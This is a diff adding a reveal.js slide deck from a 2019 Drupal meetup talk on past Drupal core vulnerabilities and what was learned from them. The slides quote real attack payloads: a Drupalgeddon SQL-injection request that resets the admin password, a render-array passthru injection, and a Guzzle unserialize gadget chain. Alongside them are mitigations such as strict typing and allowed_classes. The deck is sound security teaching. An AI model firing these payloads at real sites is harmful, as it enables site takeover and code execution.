@@ -1,0 +1,316 @@
+<!doctype html>
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+	<title>Drupal Security Learnings</title>
+
+	<link rel="stylesheet" href="css/reveal.css">
+	<link rel="stylesheet" href="css/theme/white.css">
+
+	<!-- Theme used for syntax highlighting of code -->
+	<link rel="stylesheet" href="lib/css/zenburn.css">
+
+	<script defer src="https://use.fontawesome.com/releases/v5.7.2/js/all.js"
+		integrity="sha384-0pzryjIRos8mFBWMzSSZApWtPl/5++eIfzYmTgBBmXYdhvxPc+XcFEk+zJwDgWbP"
+		crossorigin="anonymous"></script>
+
+	<!-- Printing and PDF exports -->
+	<script>
+		var link = document.createElement('link');
+		link.rel = 'stylesheet';
+		link.type = 'text/css';
+		link.href = window.location.search.match(/print-pdf/gi) ? 'css/print/pdf.css' : 'css/print/paper.css';
+		document.getElementsByTagName('head')[0].appendChild(link);
+	</script>
+</head>
+
+<body>
+	<div class="reveal">
+		<div class="slides">
+			<section data-markdown>
+				<textarea data-template data-separator-notes="^Note:">
+				# Drupal security learnings
+
+				Klaus Purer, [jobiqo.com](https://www.jobiqo.com)
+
+				[<i class="fab fa-mastodon"></i> klausi@mastodon.social](https://mastodon.social/@klausi)
+
+				[<i class="fab fa-twitter"></i> \_klausi\_](https://twitter.com/_klausi_)
+
+				Drupal Austria Meetup March 2019
+				</textarea>
+			</section>
+
+			<section data-markdown>
+				<textarea data-template data-separator-notes="^Note:">
+				## 2014: Drupalgeddon
+
+				SQL injection in the database abstraction layer
+
+				Attack:
+				```php
+				$post_data = "name[0%20;update+users+set+name%3D'admin'"
+				  . "+,+pass+%3d+'"
+				  . urlencode('$S$CTo9G7Lx2rJENglhirA8oi7v9LtLYWFrGm.F.0Jurx3aJAmSJ53g')
+				  . "'+where+uid+%3D+'1';;#%20%20]=test3&name[0]=test"
+				  . "&pass=test&test2=test&form_build_id="
+				  . "&form_id=user_login_block&op=Log+in";
+				```
+
+				Note:
+				* Catastrophic SQL injection vulnerability
+				* Exploitable as anonymous users
+				* Attacks started as early as 6 hours after the security release
+				* SQL injection in Drupal automatically means remote code execution
+				* The release was exactly on the day of a Drupal Austria meetup :-) I remember walking in
+				and asking people if they updated already
+				* Simply patching Drupal later is not enough - a hacked site needs to be restored from backup
+				on a new server
+				</textarea>
+			</section>
+
+			<section data-markdown>
+				<textarea data-template data-separator-notes="^Note:">
+				## Drupalgeddon learnings
+
+				* Learning 1: Highly critical updates are announced. Be on call to apply them!
+				* Learning 2: Web Application firewalls can filter attacks
+				* Learning 3: Validate user provided data as strictly as possible!
+				</textarea>
+			</section>
+
+			<section data-markdown>
+				<textarea data-template data-separator-notes="^Note:">
+				## Drupalgeddon learnings (2)
+
+				* Learning 4: Set secure file permissions, then attackers cannot overwrite PHP files or upload PHP shells
+				* Learning 5: Never build a DB abstraction layer yourself, it dangerous.
+
+				Note:
+				* Secure file permissions: https://www.drupal.org/node/244924
+				</textarea>
+			</section>
+
+			<section data-markdown>
+				<textarea data-template data-separator-notes="^Note:">
+				## 2018: Render array code execution SA-CORE-2018-002
+
+				Remote code execution in Render/Form API with attacker supplied "#" elements
+
+				Attack:
+				```php
+				$url = $target . $clean_url . $form
+					. "?element_parents=account/mail/%23value&ajax_form=1
+					. "&_wrapper_format=drupal_ajax";
+				$payload = "form_id=user_register_form&_drupal_ajax=1"
+				  . "&mail[a][#post_render][]=passthru&mail[a][#type]=markup"
+					. "&mail[a][#markup]=echo%20Hacked!";
+				```
+
+
+				Note:
+				* Also called Drupalgeddon 2
+				* Security team made a pre-release announcement to warn the community about the severity
+				* Luckily exploits took days to be developed by bad actors
+				* The "fix" in Drupal is to completely remove "#" elements from user
+				input in $_REQUEST, $_GET, $_POST
+				</textarea>
+			</section>
+
+			<section data-markdown>
+				<textarea data-template data-separator-notes="^Note:">
+				## Render array vulnerability learnings
+
+				* Learning 6: Don't mix control flow and user data
+				* Learning 7: Security needs to be designed from the start
+
+
+				Note:
+				* The Form API is very old. Back then PHP was not really OOP, so
+				arrays where used to represent everything.
+				* The Render API cannot simply be changed. It is big, complex and all
+				the Drupal things rely on it
+				</textarea>
+			</section>
+
+			<section data-markdown>
+				<textarea data-template data-separator-notes="^Note:">
+				## 2019: REST API code execution SA-CORE-2019-003
+
+				unserialize() executed on user provided data
+
+				```
+				GET /drupal-8.6.9/node/1?_format=hal_json HTTP/1.1
+				```
+				```json
+				{
+					"link": [
+						{
+							"value": "link",
+							"options": "<evil serialized payload>"
+						}
+					],
+					"_links": {
+						"type": {
+							"href": "http://192.168.1.25/drupal-8.6.9/rest/type/shortcut/default"
+						}
+					}
+				}
+				```
+
+				Note:
+				* Only exploitable if REST module and REST resources enabled
+				* Serialization is used to convert PHP objects or arrays into strings
+				</textarea>
+			</section>
+
+			<section data-markdown>
+				<textarea data-template data-separator-notes="^Note:">
+				## Evil unserialize() payload
+
+				<pre>
+				"O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:"
+				. "{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";"
+				. "a:1:{s:5:\"close\";a:2:{i:0;"
+				. "O:23:\"GuzzleHttp\\HandlerStack\":3:"
+				. "{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";"
+				. "s:12:\"echo HACKED!\";"
+				. "s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";"
+				. "a:1:{i:0;a:1:{i:0;s:8:\"passthru\";}}"
+				. "s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";"
+				. "b:0;}i:1;"
+				. "s:7:\"resolve\";}}s:9:\"_fn_close\";"
+				. "a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
+				</pre>
+
+				Note:
+				* Source: https://www.ambionics.io/blog/drupal8-rce
+				* PHPGGC: https://github.com/ambionics/phpggc
+				* Exploit: attacker hides `passthru("echo Hacked!")` as callback in the serialized string
+				* Needs an existing class such as FnStream here with a destructor __destruct()
+				* When the object runs out of scope and is garbage collected.
+				* The destructor is executed with the evil callback
+				</textarea>
+			</section>
+
+			<section data-markdown>
+				<textarea data-template data-separator-notes="^Note:">
+				## unserialize() vulnerability learnings
+
+				* Learning 8: never pass user provided data to unserialize().
+				Mitigation:
+				```php
+				unserialize($values, ['allowed_classes' => FALSE]);
+				```
+				* Learning 9: Defense in depth: Disable unused functionality to reduce
+				attack surface
+
+				Note:
+				* the 'allowed_classes' parameter only exists since PHP 7.
+				* I expect that REST API vulnerabilities will be more common in the
+				future as more and more people use it for decoupled sites and apps.
+				</textarea>
+			</section>
+
+			<section data-markdown>
+				<textarea data-template data-separator-notes="^Note:">
+				## PHP language fails
+
+				Access Bypass because of a typo
+
+				```php
+				function checkSharedKey($shared_key) {
+					if (strlen($shared_key) != 32) {
+						return false;
+					}
+					if (trim($shared_key) == "") {
+						return flase;
+					}
+				…
+				}
+				```
+				<pre>
+				Warning: Use of undefined constant flase - assumed 'flase'
+				(this will throw an Error in a future version of PHP)
+				</pre>
+
+				Note:
+				* Example source: https://medium.com/@DanielC7/remote-code-execution-gaining-domain-admin-privileges-due-to-a-typo-dbf8773df767
+				* PHP issues a warning, but the function will return a truthy value
+				* If you don't compare that with "===" then you get an access bypass
+				</textarea>
+			</section>
+
+			<section data-markdown>
+				<textarea data-template data-separator-notes="^Note:">
+				## PHP type hinting as security protection
+
+				Use declare() and a return type hint:
+
+				```php
+				declare(strict_types=1);
+
+				function checkSharedKey($shared_key): bool {
+					if (strlen($shared_key) != 32) {
+						return false;
+					}
+					if (trim($shared_key) == "") {
+						return flase;
+					}
+				…
+				}
+				```
+				<pre>
+				Fatal error: Uncaught TypeError: Return value of checkSharedKey()
+				must be of the type bool, string returned
+				</pre>
+
+				Note:
+				* Instead of a warning we get a fatal error now with this
+				* code execution will stop and the typo cannot be exploited.
+				</textarea>
+			</section>
+
+			<section data-markdown>
+				<textarea data-template data-separator-notes="^Note:">
+				## PHP language learnings
+
+				* Learning 10: Use type hints and `declare(strict_types=1)`
+				whenever possible
+				</textarea>
+			</section>
+
+			<section data-markdown>
+				<textarea data-template data-separator-notes="^Note:">
+				## Thank you!
+
+				Any questions?
+				</textarea>
+			</section>
+		</div>
+	</div>
+
+	<script src="lib/js/head.min.js"></script>
+	<script src="js/reveal.js"></script>
+
+	<script>
+		// More info about config & dependencies:
+		// - https://github.com/hakimel/reveal.js#configuration
+		// - https://github.com/hakimel/reveal.js#dependencies
+		Reveal.initialize({
+			fragmentInURL: true,
+			showNotes: true,
+			dependencies: [
+				{ src: 'plugin/markdown/marked.js' },
+				{ src: 'plugin/markdown/markdown.js' },
+				{ src: 'plugin/notes/notes.js', async: true },
+				{ src: 'plugin/highlight/highlight.js', async: true, callback: function () { hljs.initHighlightingOnLoad(); } }
+			]
+		});
+	</script>
+</body>
+
+</html>
